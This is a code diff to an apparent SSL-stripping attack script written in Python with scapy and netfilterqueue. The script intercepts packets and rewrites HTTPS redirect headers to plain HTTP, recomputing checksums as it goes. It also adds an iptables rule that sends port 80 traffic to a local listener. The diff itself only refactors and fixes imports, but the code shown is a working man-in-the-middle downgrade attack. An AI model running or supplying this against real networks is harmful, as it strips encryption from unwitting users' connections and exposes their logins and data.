@@ -1,7 +1,8 @@
-import netfilterqueue
+#import netfilterqueue
 from scapy.all import *
 import re
 import os
+from netfilterqueue import NetfilterQueue
 
 def process_packet(packet):
     scapy_packet = IP(packet.get_payload())
@@ -18,21 +19,18 @@ def process_packet(packet):
                 load = re.sub("Location: https://", "Location: http://", load)
 
         if load != scapy_packet[Raw].load:
-            new_packet = set_load(scapy_packet, load)
-            packet.set_payload(bytes(new_packet))
+            scapy_packet[Raw].load = load
+            del scapy_packet[IP].len
+            del scapy_packet[IP].chksum
+            del scapy_packet[TCP].chksum
+            packet.set_payload(bytes(scapy_packet))
 
     packet.accept()
 
-def set_load(packet, load):
-    packet[Raw].load = load
-    del packet[IP].len
-    del packet[IP].chksum
-    del packet[TCP].chksum
-    return packet
-
 def ssl_strip(interface):
     os.system("iptables -t nat -A PREROUTING -i {} -p tcp --destination-port 80 -j REDIRECT --to-port 10000".format(interface))
-    queue = netfilterqueue.NetfilterQueue()
+    #queue = netfilterqueue.NetfilterQueue()
+    queue = NetfilterQueue()
     try:
         queue.bind(0, process_packet)
         queue.run()
